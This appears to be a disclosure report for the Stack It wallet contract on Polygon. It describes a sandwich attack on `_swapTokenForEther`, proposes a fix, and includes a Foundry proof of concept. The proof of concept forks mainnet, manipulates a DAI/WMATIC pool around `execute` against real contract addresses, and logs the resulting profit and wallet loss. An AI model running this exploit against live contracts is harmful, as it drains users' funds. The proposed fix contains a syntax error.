# Transaction sandwich attack on `_swapTokenForEther` function

- Protocol: Stack It
- Severity: Critical

## Target(s)

- [Stack](https://polygonscan.com/address/0x64c715481Eeb457DD86B06d07A504e48C8e2c8ed#code)

## Impact(s)

- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Bug Description

In the `_swapTokenForEther`, swap tokens to ether but the `amountInMax` is determined by the function `getAmountsIn` This leaves the contract vulnerable to a sandwich attack Prior to the `execute` function, the pair could be manipulated by making `getAmountsIn` high enough so that when the swap is made the wallet contract sells most or all of its balance at the pair at a high price, receiving very little ether In return

## Impact

All the funds of the wallets

## Risk Breakdown

Difficulty to Exploit: Medium

## Recommendation

Add a `amountInMax` parameter in `execute` function and don't calculate it off-chain:

```solidity
    function execute(
        address[] memory to,
        bytes[] memory data,
        uint256[] memory value,
        IERC20 token,
        address recipient,
        uint256 gas,
        uint256 amountInMax,
    ) external payable {
        require(IStack(stack).hasDefaultAdminRole(msg.sender) || msg.sender == owner, "Wallet::execute: FORBIDDEN");
        _execute(to, data, value);
        if (gas != 0) {
            _swapTokenForEther(token, recipient, gas, amountInMax);
        }
    }

    function _swapTokenForEther(IERC20 token, address recipient, uint256 amountOut, uint256 amountInMax) private {
        IUniswapV2Router02 router = IUniswapV2Router02(IStack(stack).router());
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = router.WETH();
        SafeERC20.safeApprove(token, address(router), amountInMax);
        router.swapTokensForExactETH(amountOut, amountInMax, path, recipient, block.timestamp);
    }
```

## References

- https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swaptokensforexacteth

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/StdUtils.sol" ;
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract MyTest is Test {
    Router router = Router(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    WalletImplementation wallet = WalletImplementation(0xEa8DA79510B8A380794a92aaE3B791fb4c5B3A79);
    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 DAI = IERC20(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063);

    uint256 gas = 1e18;
    uint256 walletBal = 1_000_000e18;

    address whaleDAI = 0xF977814e90dA44bFA03b6295A0616a897441aceC;

    function setUp() public {
        // Fork
        vm.selectFork(
            vm.createFork("https://polygon-rpc.com")
        );
        vm.rollFork(43_684_447);

        // Fund wallet with DAI
        vm.prank(whaleDAI);
        DAI.transfer(address(wallet), walletBal);
    }

    function testNormalExecute() public {
        execute();
    }

    function testSandwichWMATIC() public {
        // Approve router
        DAI.approve(address(router), type(uint256).max);
        WMATIC.approve(address(router), type(uint256).max);

        uint256 amount = 4000000 ether;

        // Fund this from a DAI whale
        vm.prank(whaleDAI);
        DAI.transfer(address(this), amount);

        // Swap to chan the reserves
        address[] memory path = new address[](2);
        path[0] = address(DAI);
        path[1] = address(WMATIC);

        console.log("Initial amount in:", router.getAmountsIn(gas, path)[0]);

        router.swapExactTokensForTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );

        console.log("Post amount in:   ", router.getAmountsIn(gas, path)[0]);
        console.log();

        // At this time the `getAmountsIn` change
        // From:      777013493192305018
        // To:   98536749616130707137120

        // Run execute
        execute();

        // Swap back and return the DAI to DAI whale
        path[0] = address(WMATIC);
        path[1] = address(DAI);
        WMATIC.approve(address(router), type(uint256).max);
        router.swapTokensForExactTokens(
            amount,
            type(uint256).max,
            path,
            address(this),
            block.timestamp
        );

        DAI.transfer(address(whaleDAI), amount);

        // WMATIC profit
        console.log();
        console.log("Profit in WMATIC:  ", WMATIC.balanceOf(address(this)));
        console.log("Wallet loss in DAI:", walletBal - DAI.balanceOf(address(wallet)));
    }

    function execute() private {
        uint256 prevWalletBal = DAI.balanceOf(address(wallet));

        vm.prank(0xC95c349885d9f2f0a2B7EbC9E422B9eDA55Ea057);
        wallet.execute(
            new address[](0),
            new bytes[](0),
            new uint256[](0),
            DAI,
            address(this),
            gas
        );

        uint256 postWalletBal = DAI.balanceOf(address(wallet));

        console.log("prevWalletBal:", prevWalletBal);
        console.log("postWalletBal:", postWalletBal);
        console.log("Diff:         ", prevWalletBal - postWalletBal);
    }

    receive() external payable {}
}

interface Pair {
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface WalletImplementation {
  function execute(
    address[] memory to,
    bytes[] memory data,
    uint256[] memory value,
    IERC20 token,
    address recipient,
    uint256 gas
  ) external payable;
}

interface Router {
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
```